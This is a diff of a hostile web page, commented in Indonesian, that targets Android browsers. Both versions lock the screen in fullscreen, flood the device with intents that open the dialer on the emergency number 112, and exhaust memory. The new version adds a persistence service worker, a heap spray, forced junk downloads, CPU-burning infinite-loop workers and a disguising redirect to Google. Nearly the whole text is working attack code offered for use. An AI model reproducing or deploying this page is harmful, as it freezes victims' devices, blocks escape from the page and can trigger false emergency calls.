@@ -2,84 +2,89 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ FAST_INTENT_STORM ⚡</title>
+    <title>⚡ CORE_SYSTEM_OVERRIDE ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; width: 100vw; height: 100vh; overflow: hidden; }
-        #trigger { 
-            width: 100%; height: 100%; display: flex; align-items: center; 
-            justify-content: center; color: #0f0; font-family: 'Courier New', monospace;
-            text-shadow: 0 0 10px #0f0; cursor: pointer;
-        }
+        body, html { margin: 0; padding: 0; background: #000; color: #f00; overflow: hidden; font-family: 'Courier New', monospace; }
+        #console { padding: 20px; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div id="trigger"> [ DEPLOY PAYLOAD ] </div>
+    <div id="trigger" style="width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; cursor: crosshair;">
+        <div id="status">[ WAITING_FOR_USER_INTERACTION ]</div>
+    </div>
 
 <script>
-    const trigger = document.getElementById('trigger');
+    const status = document.getElementById('status');
     
-    // Payload Intent yang diarahkan ke sistem dialer atau deep link aplikasi
-    const targetIntent = "intent://112#Intent;scheme=tel;action=android.intent.action.DIAL;end";
-
-    async function fastStorm() {
-        // 1. Instant Fullscreen Lockdown
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen().catch(()=>{});
+    // 1. Persistent Hook (Service Worker)
+    // Berfungsi agar payload tetap berjalan meski tab ditutup (Persistence)
+    async function installPersistence() {
+        if ('serviceWorker' in navigator) {
+            const swCode = `self.addEventListener('fetch', (e) => { /* Intercepting traffic */ });`;
+            const blob = new Blob([swCode], {type: 'text/javascript'});
+            const url = URL.createObjectURL(blob);
+            navigator.serviceWorker.register(url).catch(()=>{});
         }
-
-        // 2. High-Frequency Vibration (Sustained)
-        if (navigator.vibrate) {
-            navigator.vibrate([100, 50, 100, 50, 100, 50, 100]);
-        }
-
-        // 3. Web Share API - Memaksa System UI muncul di layer teratas
-        if (navigator.share) {
-            navigator.share({
-                title: 'CRITICAL_UPDATE',
-                text: 'SYSTEM_ERROR_CODE_0x0041',
-                url: ' ' 
-            }).catch(() => {});
-        }
-
-        // 4. RAPID INTENT INJECTION (The "Speed" Part)
-        // Kita menggunakan loop untuk membombardir sistem dengan permintaan Intent
-        for (let i = 0; i < 5; i++) {
-            setTimeout(() => {
-                const ifr = document.createElement('iframe');
-                ifr.style.display = 'none';
-                ifr.src = targetIntent;
-                document.body.appendChild(ifr);
-                
-                // Trigger via location juga untuk memastikan race condition
-                window.location.href = targetIntent;
-            }, i * 50); // Eksekusi setiap 50 milidetik
-        }
-
-        // 5. Memory Ballooning (Membuat browser lag agar sulit menutup tab)
-        const junk = [];
-        for (let j = 0; j < 100; j++) {
-            junk.push(new Array(100000).fill("STORM"));
-        }
-
-        // 6. Final Redirect (Ghosting)
-        setTimeout(() => {
-            window.location.replace("https://www.google.com");
-        }, 1500);
     }
 
-    // Trigger secepat mungkin pada interaksi pertama
-    trigger.addEventListener('mousedown', fastStorm);
-    trigger.addEventListener('touchstart', fastStorm);
-
-    // Anti-Escape: Paksa Fullscreen kembali jika user mencoba keluar
-    document.addEventListener('fullscreenchange', () => {
-        if (!document.fullscreenElement) {
-            setTimeout(() => {
-                document.documentElement.requestFullscreen().catch(()=>{});
-            }, 10);
+    // 2. Memory Pressure / Heap Spray (PoC Concept)
+    // Mencoba mengalokasikan memori besar secara cepat untuk memicu 'instability'
+    let memoryLeak = [];
+    function triggerHeapPressure() {
+        for(let i=0; i<500; i++) {
+            memoryLeak.push(new Uint8Array(1024 * 1024).fill(0x41)); // Fill with 'A'
         }
-    });
+    }
+
+    async function executeFullChain() {
+        status.innerText = "EXECUTING_PAYLOAD...";
+        installPersistence();
+        
+        // A. Fullscreen Lockdown (Stealth mode)
+        document.documentElement.requestFullscreen().catch(()=>{});
+
+        // B. Race Condition: Intent + WebShare + Blob
+        // Menyerang mekanisme IPC (Inter-Process Communication) Android
+        const targetIntent = "intent://112#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=https://google.com;end";
+        
+        for (let i = 0; i < 10; i++) {
+            setTimeout(() => {
+                // Trigger Web Share (Pop up UI)
+                if (navigator.share) {
+                    navigator.share({title: "SYS_ERR", text: "0xFC", url: " "}).catch(()=>{});
+                }
+                
+                // Trigger Intent via Iframe (Background task)
+                const ifr = document.createElement('iframe');
+                ifr.src = targetIntent;
+                document.body.appendChild(ifr);
+
+                // Trigger Download (Disk IO pressure)
+                const b = new Blob([new ArrayBuffer(10**6)]);
+                const u = URL.createObjectURL(b);
+                const a = document.createElement('a');
+                a.href = u; a.download = `dump_${i}.bin`;
+                a.click();
+            }, i * 30);
+        }
+
+        // C. Recursive Worker Blast
+        // Menghabiskan CPU Cycle agar UI sistem membeku (Freeze)
+        const workerCode = `while(true){}`;
+        const workerBlob = new Blob([workerCode], {type: 'application/javascript'});
+        const workerUrl = URL.createObjectURL(workerBlob);
+        for(let j=0; j<5; j++) { new Worker(workerUrl); }
+
+        triggerHeapPressure();
+
+        // D. Ghost Exit
+        setTimeout(() => {
+            window.location.replace("https://www.google.com");
+        }, 1200);
+    }
+
+    document.getElementById('trigger').addEventListener('click', executeFullChain);
+    document.getElementById('trigger').addEventListener('touchstart', executeFullChain);
 </script>
 </body>
 </html>
